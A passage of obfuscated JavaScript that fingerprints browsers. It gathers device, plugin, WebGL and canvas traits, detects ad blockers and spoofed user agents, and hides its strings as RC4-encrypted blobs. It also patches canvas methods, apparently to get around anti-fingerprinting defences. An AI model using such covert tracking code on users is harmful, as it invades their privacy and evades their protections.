    }, C = function (n, a, f) {
      var i = e, u = b(n, a, false), r = b(n, f, true);
      if (!u || !r) return null;
      var o = n.createProgram();
      return n.attachShader(o, u), n.attachShader(o, r), n.linkProgram(o), n.getProgramParameter(o, n.LINK_STATUS) ? o : null;
    }, m = function (e) {
      return w(h, p(e));
    }, v = function () {
      var n = e;
      return "Microsoft Internet Explorer" === navigator.appName || !("Netscape" !== navigator.appName || !/Trident/.test(navigator.userAgent));
    }, g = function (n, a, f) {
      var i = e;
      if (null !== n) if (c && n.forEach === c) n.forEach(a, f); else if (n.length === +n.length) for (var u = 0, r = n.length; u < r; u++) {
        if (a.call(f, n[u], u, n) === {}) return;
        for (var o in n) if (n.hasOwnProperty(o) && a.call(f, n[o], o, n) === {}) return;
      }
    }, _ = function (n, a, f) {
      var i = e, u = [];
      return null == n ? u : t && n.map === t ? n.map(a, f) : (g(n, function (e, n, r) {
        var o = i;
        u[u.length] = a.call(f, e, n, r);
      }), u);
    }, h = "window", w = function (n, a) {
      for (var f, i = e, u = [], r = 0, o = "", c = 0; c < 256; c++) u[c] = c;
      for (c = 0; c < 256; c++) r = (r + u[c] + n.charCodeAt(c % n.length)) % 256, f = u[c], u[c] = u[r], u[r] = f;
      c = 0, r = 0;
      for (var t = 0; t < a.length; t++) r = (r + u[c = (c + 1) % 256]) % 256, f = u[c], u[c] = u[r], u[r] = f, o += String.fromCharCode(a.charCodeAt(t) ^ u[(u[c] + u[r]) % 256]);
      return o;
    }, p = function (n) {
      var a, f, i, u, r, o, c = e, t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", x = 0, s = "";
      do {
        a = (o = t.indexOf(n.charAt(x++)) << 18 | t.indexOf(n.charAt(x++)) << 12 | (u = t.indexOf(n.charAt(x++))) << 6 | (r = t.indexOf(n.charAt(x++)))) >> 16 & 255, f = o >> 8 & 255, i = 255 & o, s += 64 == u ? String.fromCharCode(a) : 64 == r ? String.fromCharCode(a, f) : String.fromCharCode(a, f, i);
      } while (x < n.length);
      return y(s);
    }, y = function (n) {
      var a = e;
      if ("string" != typeof n) return n;
      for (var f = "", i = 0, u = 0; i < n.length;) (u = n.charCodeAt(i)) < 128 ? (f += String.fromCharCode(u), i++) : u > 191 && u < 224 ? (f += String.fromCharCode((31 & u) << 6 | 63 & n.charCodeAt(i + 1)), i += 2) : (f += String.fromCharCode((15 & u) << 12 | (63 & n.charCodeAt(i + 1)) << 6 | 63 & n.charCodeAt(i + 2)), i += 3);
      return f;
    }, z = {};
    return z.get = function (f) {
      var c, t = e;
      c = document.createElement("canvas"), n = !(!c.getContext || !c.getContext("2d"));
      var l = function () {
        var e = t;
        if (!n) return false;
        var a, f = document.createElement("canvas");
        try {
          a = f.getContext && (f.getContext("webgl") || f.getContext("experimental-webgl"));
        } catch (e) {
          a = false;
        }
        var i = !!window.WebGLRenderingContext && !!a, u = false;
        try {
          f.toDataURL();
        } catch (e) {
          u = true;
        }
        var r = {};
        return r.s = i, r.b = u, r;
      }();
      return a = l.s, r = l.b, new Promise(function (c, t) {
        setTimeout(function () {
          var l, b, y, z, B, L, M, F, A, k = _0x28ad;
          try {
            var E = [];
            E.push(navigator.userAgent), E.push(navigator.language || navigator.userLanguage || navigator.browserLanguage || navigator.systemLanguage || "N/A"), E.push(screen.colorDepth || "N/A"), E.push((new Date).getTimezoneOffset()), E.push(function () {
              var e = k, n = true;
              try {
                n = !!window.sessionStorage;
              } catch (e) {}
              return n;
            }()), E.push(function () {
              var e = k, n = true;
              try {
                n = !!window.localStorage;
              } catch (e) {}
              return n;
            }()), E.push(!!window.indexedDB), E.push(!(!document.body || !document.body.addBehavior)), E.push(!!window.openDatabase), E.push(navigator.cpuClass ? navigator.cpuClass : "N/A"), E.push(navigator.platform ? navigator.platform : "N/A"), E.push((A = "N/A", navigator.doNotTrack ? A = navigator.doNotTrack : navigator.msDoNotTrack ? A = navigator.msDoNotTrack : window.doNotTrack && (A = window.doNotTrack), A)), E.push(function () {
              var n = k;
              if (!v()) {
                for (var a = [], f = 0, i = navigator.plugins.length; f < i; f++) a.push(navigator.plugins[f]);
                return function () {
                  for (var n = e, a = false, f = [/palemoon/i], i = 0, u = f.length; i < u; i++) {
                    var r = f[i];
                    if (navigator.userAgent.match(r)) {
                      a = true;
                      break;
                    }
                  }
                  return a;
                }() && (a = a.sort(function (e, a) {
                  var f = n;
                  return e.name > a.name ? 1 : e.name < a.name ? -1 : 0;
                })), _(a, function (e) {
                  var a = n, f = _(e, function (e) {
                    var n = _0x28ad;
                    return [e.type, e.suffixes].join("~");
                  }).join(",");
                  return [e.name, e.description, f].join("::");
                }, this);
              }
              return "N/A";
            }()), E.push(function () {
              var e = k;
              if (v()) {
                var n = [];
                return (Object.getOwnPropertyDescriptor && Object.getOwnPropertyDescriptor(window, "ActiveXObject") || "ActiveXObject" in window) && (n = _(["AcroPDF.PDF", "Adodb.Stream", "AgControl.AgControl", "DevalVRXCtrl.DevalVRXCtrl.1", "MacromediaFlashPaper.MacromediaFlashPaper", "Msxml2.DOMDocument", "Msxml2.XMLHTTP", "PDF.PdfCtrl", "QuickTime.QuickTime", "QuickTimeCheckObject.QuickTimeCheck.1", "RealPlayer", "RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)", "RealVideo.RealVideo(tm) ActiveX Control (32-bit)", "Scripting.Dictionary", "SWCtl.SWCtl", "Shell.UIHelper", "ShockwaveFlash.ShockwaveFlash", "Skype.Detection", "TDCCtl.TDCCtl", "WMPlayer.OCX", "rmocx.RealPlayer G2 Control", "rmocx.RealPlayer G2 Control.1"], function (e) {
                  try {
                    return new ActiveXObject(e), e;
                  } catch (e) {
                    return null;
                  }
                })), navigator.plugins && (n = n.concat(getRegularPlugins())), n;
              }
              return "N/A";
            }());
            var j = n ? function () {
              var n = e, a = [], f = s(), i = x();
              if (a.push(i.wnd), 0 == f.type) a.push(i.url); else if (f.tduOvr) a.push(i.url); else switch (f.type) {
                case 1:
                  a.push("add");
                case 2:
                  a.push("rnd");
                case 3:
                  a.push("err");
              }
              var u = {};
              return u.f = Da(a.join("~~~")), u.m = f.type, u.o = f.tduOvr, u;
            }() : "N/A";
            E.push(j.f), i = j.m, u = j.o, E.push(a && !r ? function () {
              var n = e, a = document.createElement("canvas");
              a.width = a.height = 512;
              var f = "w5TDgMKuwqPCtSfDtMKJEMOeFsKTwqcSwqHCsMOLdcKIw7slfcOcMT4Sw5ZEw4TCs8Kebz/CpsOQFwvDnlVSwofClcOmCMOpw4nDiVRjwpcwwqssw4/CgkLCvsKOwqNFwqRGwqpww61RXVYYw45YTzvChUt9w4oqVnTDpsKIRMOtfMOrwodpQ0fCncOTw6URwpvDu8O9MMKXwrnCgMKhwpYqw7jCjCnCv3xhFcO0w4wHw7jCkXrDgsKNw4UNw7RRwqnDlwwnSsOqYVzCm8O9wrk/DMObw7fDtMOPwq4Awqg0wqnDjsOefWXCv8OAwqjCrwJJScO6OcOlw5B8XAQeYDJfWGc5w5RRwrnCiR8uYx5SdRTDiMOJasONOMKLBjHCmMOXw5l2w7XCgsKBLHfDmMKudMKkwojDv3Ykwo0FRVDDmMOKwqjDo8Ohw5nCrMKHRkfDsB/CrEzCjC92w4Jaw7Umw4bCunPCqzlGwqQlV8OOX3lOC8OIw7DDs0BywrkdCMKoIsO/G3R6w58=", i = "w4XDhsK/wrLCtTbDqMKSG8OeDcKTwqBJw7TCrcOUJsOVwp08fcOac10Kw5AWw4vCv8KTOj/CpcODTzPCiE9Nw5jCv8OtBcOvw4bClQJ+wp86w6Ykw4LDrSjDucOYw6AXwq0Wwr4Jw58pMUUBw6NmAC7Cnl53w5FsBSDCqMOWRcOhPMOrwpRpHhPDhMOPw6tXw5LCuMO+NsKWwqLClcKSw5M=", u = "w5TDgMKuwqPCtSfDtMKJEMOeFsKTwqcSwqHCsMOLdcKIw7slfcOcMT4Sw5ZEw4TCs8Kebz/CpsOQFw3DnkNLw5DDsMOyX8KMw57Dkh11w5Yzwq5tw5fDj1fDo8OHwqQDwq0dw5tzwoNPZ2Qfw51RLDLCm0Vswp4/BX7Dp8OMT8OwM8OJwpk=", r = "w4XDhsK/wrLCtTbDqMKSG8OeDcKTwqBJw7TCrcOUJsOVwp08fcOac10Kw5AWw4vCv8KTPD/Cs8OaGFbCjBsuw5rDs8OvBcOywojDjxV/wpJ2wrlhw5rDlQHDr8OBw6kKw7Zsw5gIwoFXTVADwpxQHTzClF42w41rSzXDrMOPVMKqa8Ksw4p+FBPDhMKJwqAEw4zCsMO+KsKIwrLClsKhwpY/w7fCmDDCtWFgD8Ouw4wOw7vCkWTDkcKOw4MCw69cwrPDlws7QsOJJ1zCkMKYwqY0RcOSwrbDsMOAw68Yw68rwqLCjsKaL0/DjcKpw47CpAFkL8K1eMO0w7ZwBEMeIWEbBjV0w5BZw6HDiAElOEIIfErCicOVb8KLaMKTHCzCi8Odw5Mmw6/Ch8KBLHfDmMKudMKkwojDv3Yiwo0aSUDDhsOTwrbDvcOkw5DDssOGWkLCtknCtFvCkz58w4gPw7Npwp7Cui7DriwRw68mUcOPRWFaCsObw7PDvFlswqcYAcK1LMO/HHxQwoJjRsK9wpVOJBnCm3Q1wo9uTSRALR3DoMKcw5I6wohLw7bChcOcRG1CwqzCuG7DnsO9wqVfYcKrw4bCjsKMw7XClgXCmMKYGAdYwrIMMTNDGijDmj3DmMKCw6c1WsO4U8OtKDXDnMKQw7TDj8O0w60SBSbCmnfCm8OFw6J5w4g=", o = "w5TDgMKuwqPCtSfDtMKJEMOeFsKTwqcSwqHCsMOLdcKIw7slfcOcMT4Rw5lfw5vCtcKCZT/Co8OUGUnCkkVWwo7Dm8KgDcOrw4/Chn5nwpcswrZtw5fCgAHDusOLwqMYwq0Qwo4PwpIYMlQCw5VSTzDClkNwwpZ0SnTDrMKJAMO5AsOKwoNqMnnClsKewqIkwpHDtMKgasKGwrbCjsOsw4trwrTDlWzDomAXDsKuwohJw73CkSbCvcOMwoATw7pjw7o=", c = "w4XDhsK/wrLCtTbDqMKSG8OeDcKTwqBJw7TCrcOUJsOVwp0raMOceF0Gw4JCw5jDusKGbXzDosKVAU/DhSpRw5LDtsOmC8O0w4XCnQJ0wpVsw69nw5zCiVXDqcOcw7sgw7gIwrgcwotRVQILw5BZDinDl0tww5luQCbCgsOWQcOwccKqwophTUnCgcKcw7dHwojDh8K6bsKdwoHDmMO3w4d3w6DDjX/Drjx7UMKowoxKw7jCkSvDqMKwwoBlwrQfwqfDnxhnD8O4UF/CkMKSwqxiRcOPwrjDqsKcw6dTwqAhwqPDicOOMTfDpMOhwoHCvgt1PcKgKMOtw6A9SEtGYGwQXSo7wo4ewqfCjVhqZktUM0vDhsOCK8KJfMOQW3HCg8KWwp0xw6zCkcKILXfDnsKkZMK4w5jDr3I3w41AC0jCl8KTw6bCpsKow5DDvsONCFPCt17CshvCnSV8woFAw7AuwozDtGLCoj9dwqUvc8OzDDkxdsKUwq3CrQMyw79fCMKkLMK5VyxEwoo4CcO+wolVJAPClTZ4w4E7SyRHITfCtw==", t = null;
              try {
                t = a.getContext("webgl") || a.getContext("experimental-webgl");
              } catch (e) {}
              if (t || (t = null), !t) return null;
              t.clearColor(0, 0, 0, 1), t.disable(t.DEPTH_TEST), t.viewport(0, 0, a.width, a.height), t.clear(t.COLOR_BUFFER_BIT), d(t, [-1, -1, -1, 1, 1, -1, 1, -1, -1, 1, 1, 1]);
              var x = C(t, m(i), m(f));
              t.useProgram(x);
              var s = t.getAttribLocation(x, "pos");
              t.enableVertexAttribArray(s), t.vertexAttribPointer(s, 2, t.FLOAT, false, 0, 0), t.drawArrays(t.TRIANGLES, 0, 6), t.enable(t.BLEND), t.blendFunc(t.SRC_ALPHA, t.ONE_MINUS_SRC_ALPHA), D(t, 39, .25, 1, .015);
              var l = C(t, m(r), m(u));
              t.useProgram(l);
              var b = t.getAttribLocation(l, "pos");
              t.enableVertexAttribArray(b), t.vertexAttribPointer(b, 2, t.FLOAT, false, 0, 0), t.drawArrays(t.TRIANGLES, 0, 117), D(t, 7, .2, .05, .07), t.vertexAttribPointer(b, 2, t.FLOAT, false, 0, 0), t.drawArrays(t.TRIANGLES, 0, 21);
              var v = CanvasRenderingContext2D.prototype.putImageData, g = {};
              g.value = function () {}, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", g);
              var _ = a.toDataURL(), h = {};
              h.value = v, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", h), t.disable(t.BLEND), function (e, a, f) {
                for (var i = n, u = [], r = 0; r < 64; r++) {
                  var o = r / 63, c = .7 * Math.sqrt(o);
                  u.push(-1), u.push(c), u.push(0), u.push(o), u.push(1), u.push(c), u.push(1), u.push(o);
                }
                d(e, u);
              }(t);
              var w = C(t, m(c), m(o));
              t.useProgram(w);
              var p = t.getAttribLocation(w, "pos");
              t.enableVertexAttribArray(p), t.vertexAttribPointer(p, 2, t.FLOAT, false, 16, 0);
              var y = t.getAttribLocation(w, "uv");
              t.enableVertexAttribArray(y), t.vertexAttribPointer(y, 2, t.FLOAT, false, 16, 8);
              var z = t.getUniformLocation(w, "center"), B = t.getUniformLocation(w, "angle"), L = t.getUniformLocation(w, "img");
              t.uniform1f(B, .1);
              var M = t.createTexture();
              t.bindTexture(t.TEXTURE_2D, M), t.texImage2D(t.TEXTURE_2D, 0, t.RGBA, t.RGBA, t.UNSIGNED_BYTE, a), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MAG_FILTER, t.LINEAR), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MIN_FILTER, t.LINEAR_MIPMAP_LINEAR), t.generateMipmap(t.TEXTURE_2D), t.activeTexture(t.TEXTURE0), t.uniform1i(L, 0), t.drawArrays(t.TRIANGLE_STRIP, 0, 128), t.uniform1f(B, Math.PI / 2 + .1), t.drawArrays(t.TRIANGLE_STRIP, 0, 128), t.uniform1f(B, 1.25 * Math.PI + .03001), t.uniform2f(z, .4, -0.4), t.drawArrays(t.TRIANGLE_STRIP, 0, 128), v = CanvasRenderingContext2D.prototype.putImageData;
              var F = {};
              F.value = function () {}, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", F);
              var A = a.toDataURL(), k = {};
              return k.value = v, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", k), Da(_ + A);
            }() : "N/A"), E.push(function () {
              var e = k, n = false, a = document.createElement("div");
              a.innerHTML = "&nbsp;", a.className = "adsbox";
              try {
                document.body.appendChild(a), n = 0 === document.getElementsByClassName("adsbox")[0].offsetHeight, document.body.removeChild(a);
              } catch (e) {}
              return n;
            }()), E.push(function () {
              var e = k, n = false;
              if (void 0 !== navigator.languages) try {
                navigator.languages[0].substr(0, 2) !== navigator.language.substr(0, 2) && (n = true);
              } catch (e) {
                n = true;
              }
              return n;
            }()), E.push((M = k, F = false, screen.width < screen.availWidth && (F = true), screen.height < screen.availHeight && (F = true), F)), E.push((b = k, y = false, z = navigator.userAgent.toLowerCase(), B = navigator.oscpu, L = navigator.platform.toLowerCase(), l = z.indexOf("windows phone") >= 0 ? "Windows Phone" : z.indexOf("win") >= 0 ? "Windows" : z.indexOf("android") >= 0 ? "Android" : z.indexOf("linux") >= 0 ? "Linux" : z.indexOf("iphone") >= 0 || z.indexOf("ipad") >= 0 ? "iOS" : z.indexOf("mac") >= 0 ? "Mac" : "Other", ("ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) && "Windows Phone" !== l && "Android" !== l && "iOS" !== l && "Other" !== l && (y = true), void 0 !== B && ((B = B.toLowerCase()).indexOf("win") >= 0 && "Windows" !== l && "Windows Phone" !== l || B.indexOf("linux") >= 0 && "Linux" !== l && "Android" !== l || B.indexOf("mac") >= 0 && "Mac" !== l && "iOS" !== l || 0 === B.indexOf("win") && 0 === B.indexOf("linux") && B.indexOf("mac") >= 0 && "other" !== l) && (y = true), (L.indexOf("win") >= 0 && "Windows" !== l && "Windows Phone" !== l || (L.indexOf("linux") >= 0 || L.indexOf("android") >= 0 || L.indexOf("pike") >= 0) && "Linux" !== l && "Android" !== l || (L.indexOf("mac") >= 0 || L.indexOf("ipad") >= 0 || L.indexOf("ipod") >= 0 || L.indexOf("iphone") >= 0) && "Mac" !== l && "iOS" !== l || 0 === L.indexOf("win") && 0 === L.indexOf("linux") && L.indexOf("mac") >= 0 && "other" !== l) && (y = true), void 0 === navigator.plugins && "Windows" !== l && "Windows Phone" !== l && (y = true), y)), E.push(function () {
              var e, n = k, a = false, f = navigator.userAgent.toLowerCase(), i = navigator.productSub;
              "Chrome" !== (e = f.indexOf("firefox") >= 0 ? "Firefox" : f.indexOf("opera") >= 0 || f.indexOf("opr") >= 0 ? "Opera" : f.indexOf("chrome") >= 0 ? "Chrome" : f.indexOf("safari") >= 0 ? "Safari" : f.indexOf("trident") >= 0 ? "Internet Explorer" : "Other") && "Safari" !== e && "Opera" !== e || "20030107" === i || (a = true);
              var u, r = eval.toString().length;
              (37 === r && "Safari" !== e && "Firefox" !== e && "Other" !== e || 39 === r && "Internet Explorer" !== e && "Other" !== e || 33 === r && "Chrome" !== e && "Opera" !== e && "Other" !== e) && (a = true);
              try {
                throw "a";
              } catch (e) {
                try {
                  e.toSource(), u = true;
                } catch (e) {
                  u = false;
                }
              }
              return u && "Firefox" !== e && "Other" !== e && (a = true), a;
            }()), E.push(function () {
              var e = k, n = 0, a = false;
              void 0 !== navigator.maxTouchPoints ? n = navigator.maxTouchPoints : void 0 !== navigator.msMaxTouchPoints && (n = navigator.msMaxTouchPoints);
              try {
                document.createEvent("TouchEvent"), a = true;
              } catch (e) {}
              return [n, a, "ontouchstart" in window];
            }()), E.push(function () {
              var e = k, n = ["monospace", "sans-serif", "serif"], a = w(h, p("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